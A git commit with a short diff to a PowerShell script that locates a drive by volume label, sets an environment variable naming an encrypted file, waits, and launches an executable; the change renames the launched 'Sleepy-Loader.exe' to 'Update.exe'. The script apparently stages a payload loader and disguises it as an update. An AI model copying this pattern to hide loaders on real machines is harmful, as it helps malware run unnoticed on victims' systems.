44200ab37fffc751e90168bbc0f738bc38d7e274
RkDx <61869865+RkDx@users.noreply.github.com>
2022-10-02 01:55:06 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -2,4 +2,4 @@ $Env:hagrid="mdll s0.enc";
 $device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-d065c789ca4aede" | foreach { $_.DeviceID });
 cd $device;
 sleep 10;
-.\Sleepy-Loader.exe
+.\Update.exe
